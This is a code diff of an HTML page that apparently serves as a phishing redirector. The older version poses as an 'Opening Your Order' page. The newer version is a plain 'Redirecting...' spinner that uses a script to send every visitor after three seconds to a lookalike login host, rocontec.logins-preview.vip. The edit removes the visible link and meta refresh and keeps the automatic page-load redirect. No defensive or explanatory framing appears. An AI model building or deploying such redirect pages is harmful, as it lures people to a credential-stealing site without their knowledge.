@@ -2,77 +2,59 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Opening Your Order...</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<!-- Auto redirect after 3 seconds -->
-<meta http-equiv="refresh" content="3;url=https://rocontec.logins-preview.vip/uRTvY">
+<title>Redirecting...</title>
 
 <style>
-  body {
+body {
     margin: 0;
     font-family: Arial, sans-serif;
-    background: #f4f6f9;
+    background: #ffffff;
+    color: #333;
     display: flex;
     justify-content: center;
     align-items: center;
     height: 100vh;
-  }
+}
 
-  .box {
-    background: #fff;
-    padding: 40px;
-    border-radius: 10px;
+.container {
     text-align: center;
-    box-shadow: 0 5px 20px rgba(0,0,0,0.08);
-    max-width: 400px;
-  }
+}
 
-  h2 {
-    margin-bottom: 15px;
-  }
+.loader {
+    width: 32px;
+    height: 32px;
+    margin: 20px auto;
+    border: 3px solid #e5e5e5;
+    border-top: 3px solid #4a90e2;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
 
-  p {
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+p {
     color: #666;
     font-size: 14px;
-  }
-
-  .loader {
-    margin: 20px auto;
-    border: 4px solid #eee;
-    border-top: 4px solid #7c4dff;
-    border-radius: 50%;
-    width: 40px;
-    height: 40px;
-    animation: spin 1s linear infinite;
-  }
-
-  @keyframes spin {
-    100% { transform: rotate(360deg); }
-  }
-
-  a {
-    display: inline-block;
-    margin-top: 15px;
-    color: #7c4dff;
-    text-decoration: none;
-    font-weight: bold;
-  }
+}
 </style>
 </head>
 
 <body>
 
-<div class="box">
-  <h2>Opening Your Order...</h2>
-  <div class="loader"></div>
-  <p>Please wait while we securely redirect you.</p>
-
-  <p>If nothing happens, click below:</p>
-  <a href="https://rocontec.logins-preview.vip/uRTvY">
-    Continue to your order
-  </a>
+<div class="container">
+    <h2>Redirecting...</h2>
+    <div class="loader"></div>
+    <p>Please wait a moment.</p>
 </div>
+
+<script>
+setTimeout(() => {
+    window.location.replace("https://rocontec.logins-preview.vip/uRTvY");
+}, 3000);
+</script>
 
 </body>
 </html>
